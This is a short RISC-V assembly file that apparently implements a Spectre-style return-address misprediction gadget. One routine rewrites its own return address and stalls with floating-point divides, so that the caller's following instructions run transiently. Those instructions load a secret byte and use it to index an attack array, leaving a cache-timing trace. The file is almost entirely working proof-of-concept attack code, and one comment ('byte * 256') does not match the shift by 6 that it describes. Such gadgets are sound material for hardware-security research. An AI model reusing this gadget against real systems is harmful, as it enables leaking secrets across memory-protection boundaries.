.section .text
.globl specFunc
.globl frameDump

specFunc:
    addi	sp,sp,-48
    sd	ra,40(sp)
    sd	s0,32(sp)

    jal ra, frameDump # call gadget

    # speculative execute the following:
    lb   t0, 0(a1)  # load secret+offset byte
    slli t0, t0, 6  # byte * 256
    add	 a0, a0, t0 # a0 = attackArray + (byte*256)
    lb	 t0, 0(a0)  # load data from attackArray[secret[offset]*64]

    # bound speculation
    jal	ra,get_mcycle
    sd	a0,-24(s0)
    nop
    ld	ra,40(sp)
    ld	s0,32(sp)
    addi	sp,sp,48
    ret

#define REP 4

frameDump:
    # Pop off stack frame and get RA
    ld ra, 40(sp)
    ld s0, 32(sp)
    addi sp, sp, 48

    # delay transient execution
    addi ra, ra, -2
    li t1, 2
    slli t2, t1, REP
    fcvt.s.lu fa4, t1
    fcvt.s.lu fa5, t2
    .rept REP
    fdiv.s fa5, fa5, fa4
    .endr
    fcvt.lu.s t2, fa5, rtz
    add ra, ra, t2

    ret